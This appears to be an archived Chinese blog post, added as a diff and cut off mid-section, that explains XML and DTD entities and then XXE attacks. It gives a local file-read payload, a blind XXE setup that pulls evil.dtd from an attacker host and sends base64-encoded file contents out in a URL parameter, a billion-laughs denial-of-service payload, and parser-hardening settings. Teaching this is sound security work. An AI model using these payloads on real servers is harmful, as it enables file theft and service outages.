@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    
+    <title>xxe - Hexo</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="xmlxml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已 1234567891011121314&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;   xml声明&lt;!DOCTYPE note [   内部的dtd 被包装在一个doctype声明中  &lt;!ELEMENT note (to,from,heading,body)&gt;  &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xxe">
+<meta property="og:url" content="https://0xr1ngs.github.io/2018/06/02/xxe/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="xmlxml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已 1234567891011121314&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;   xml声明&lt;!DOCTYPE note [   内部的dtd 被包装在一个doctype声明中  &lt;!ELEMENT note (to,from,heading,body)&gt;  &amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0xr1ngs.github.io/2018/06/02/xxe/1.png">
+<meta property="og:image" content="https://0xr1ngs.github.io/2018/06/02/xxe/2.png">
+<meta property="og:image" content="https://0xr1ngs.github.io/2018/06/02/xxe/3.png">
+<meta property="article:published_time" content="2018-06-02T11:12:55.000Z">
+<meta property="article:modified_time" content="2023-07-10T07:19:00.092Z">
+<meta property="article:author" content="r1ngs">
+<meta property="article:tag" content="总结">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0xr1ngs.github.io/2018/06/02/xxe/1.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688978534309">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1688978534309">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1688978534309">
+        
+    
+
+    
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+
+
+    <script async src="/js/app.js?v=1688978534309"></script>
+    
+     
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" 
+            style="background-image: url(/images/wallpaper.png)"
+        ></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="r1ngs" class="mdui-btn mdui-btn-icon"><img src="/images/avator.jpg" alt="r1ngs"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="r1ngs">
+            <img src="/images/avator.jpg" alt="r1ngs" alt="r1ngs">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>10</div>
+        <div><span>Tags</span>9</div>
+        <div><span>Categories</span>1</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+        
+            
+            <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+        
+            
+            <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://github.com/0xr1ngs/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Categories</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/cbc/" style="font-size: 10px;">cbc</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sqli/" style="font-size: 10px;">sqli</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 20px;">总结</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(9);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/19/Java-Jndi/">Jndi注入</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">LGP_内网渗透</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/31/java-random/">java_random</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/28/cbc-bit-flip/">cbc_bit_flip</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/xss/">xss</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+        
+    </aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 r1ngs
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+    <div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="/images/wallpaper.png" alt="xxe" loading="lazy">
+            <h1>xxe</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2018年06月02日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h1><p>xml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>   xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [   内部的dtd 被包装在一个doctype声明中</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>  根元素 必须有</span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span>  4个子元素 子元素还可以有子元素</span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="dtd-文档类型定义"><a href="#dtd-文档类型定义" class="headerlink" title="dtd 文档类型定义"></a>dtd 文档类型定义</h1><p>dtd的作用是定义xml文档的合法构建模块</p>
+<h2 id="内部"><a href="#内部" class="headerlink" title="内部"></a>内部</h2><p>dtd可被成行地声明于xml文档中，也可以作为一个外部引用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [  定义此文档是note类型的文档 </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>   定义note元素有四个子元素 </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>      (<span class="keyword">#PCDATA</span>)&gt;</span>  定义元素 类型为&quot;#PCDATA&quot; </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>    (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="外部"><a href="#外部" class="headerlink" title="外部"></a>外部</h2><p>dtd如果部署在外部，则应该这样声明</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">外部的note.dtd文件 </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量<br>实体可以在内部或者外部声明</p>
+<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>一个实体由一个&amp;，一个实体名称，一个;构成</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;r1ngs&quot;</span>&gt;</span>  在dtd里声明 </span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span>  xml里引用 </span><br></pre></td></tr></table></figure>
+
+<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;url&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>仅仅在dtd中使用的解析实体为参数实体</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">writer</span> <span class="string">&quot;r1ngs&quot;</span>&gt;</span>  内部 </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">writer</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;url&quot;</span>&gt;</span>  外部 </span><br></pre></td></tr></table></figure>
+
+<p>在dtd内引用： %writer;</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>php里的simplexml_load_string在旧版本里默认解析外部实体</p>
+<ul>
+<li>如果网站解析的xml是外部可控的，或者在与服务器交互的时候将json数据格式改为xml，都可能会导致服务器解析恶意的xml脚本</li>
+</ul>
+<h2 id="读取文件-x2F-x2F-不同程序支持协议不一样-读取失败的时候可以考虑php-x2F-x2F-filter"><a href="#读取文件-x2F-x2F-不同程序支持协议不一样-读取失败的时候可以考虑php-x2F-x2F-filter" class="headerlink" title="读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter"></a>读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///home/ctf/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aaa</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">aaa</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>没有数据回显的时候<br>有的解析器不能在实体定义的时候引用参数实体，所以要把声明放到攻击者的服务器<br>漏洞复现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;xxe test！&lt;/h3&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$xml</span> = <span class="string">&#x27;&lt;!DOCTYPE ANY [  </span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.41.1:81/evil.dtd&quot;&gt;  </span></span><br><span class="line"><span class="string">%remote;  </span></span><br><span class="line"><span class="string">%param1;</span></span><br><span class="line"><span class="string">]&gt;  </span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;external;&lt;/root&gt;&#x27;</span>;  </span><br><span class="line"><span class="keyword">try</span>&#123;   </span><br><span class="line"><span class="variable">$doc</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>);  </span><br><span class="line">&#125;   </span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;   </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;error&quot;</span>;   </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">远程的dtd文件</span><br><span class="line">&lt;!ENTITY % payload SYSTEM <span class="string">&quot;php://filter/convert.base64-encode/resource=1.txt&quot;</span>&gt;  </span><br><span class="line">&lt;!ENTITY % param1 <span class="string">&quot;&lt;!ENTITY  external SYSTEM &#x27;http://192.168.41.1:81/1.php?file=%payload;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="dos攻击"><a href="#dos攻击" class="headerlink" title="dos攻击"></a>dos攻击</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol1</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>还有执行系统命令，探测内网端口等效果</p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul>
+<li>禁止使用外部实体</li>
+</ul>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml<span class="constructor">_disable_entity_loader(<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =<span class="module-access"><span class="module"><span class="identifier">DocumentBuilderFactory</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line">dbf.set<span class="constructor">ExpandEntityReferences(<span class="params">false</span>)</span>;</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.<span class="constructor">XMLParser(<span class="params">resolve_entities</span>=False)</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤用户提交的xml数据</li>
+</ul>
+<h1 id="赛总♂牛逼"><a href="#赛总♂牛逼" class="headerlink" title="赛总♂牛逼"></a>赛总♂牛逼</h1><p>在写这篇文章的时候翻了一下之前和赛总的聊天记录，赛总之前教了我一个没有vps也能实现blind xxe的黑魔法</p>
+<h2 id="burp-collaborator-client"><a href="#burp-collaborator-client" class="headerlink" title="burp collaborator client"></a>burp collaborator client</h2><p>burp里的这个功能可以随机生成一条由burp.collaborator.server分给你的链接，任何访问了这个链接的请求都会被记录下来，当关掉这个面板的时候链接失效<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2018/06/02/xxe/1.png" alt="1" data-caption="1" loading="lazy"></p>
+<h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><p>github上可以托管代码文件，raw功能预览代码，此时url就可以作为远程文件的链接</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/R1ng6/</span>CTFtool<span class="regexp">/master/</span>evil.dtd</span><br></pre></td></tr></table></figure>
+
+<p>但是当时我找了一个普通的xxe的ctf题目，发现调用参数实体的时候无法访问dtd文件里面指向的collaborator链接<br>后来发现是默认不支持协议<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2018/06/02/xxe/2.png" alt="1" data-caption="1" loading="lazy"><br>github上的链接是https协议，php默认不支持</p>
+<h2 id="搭博客，买域名"><a href="#搭博客，买域名" class="headerlink" title="搭博客，买域名"></a>搭博客，买域名</h2><p>正好之前用github搭建了博客，还买了域名进行重定向，用域名访问博客地址就是http协议，于是我马上试了一下<br>在靶机里面的xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$xml = &#x27;<span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://r1ngs.top/test.dtd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">%remote;  </span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;external;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span>&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>github上的dtd</p>
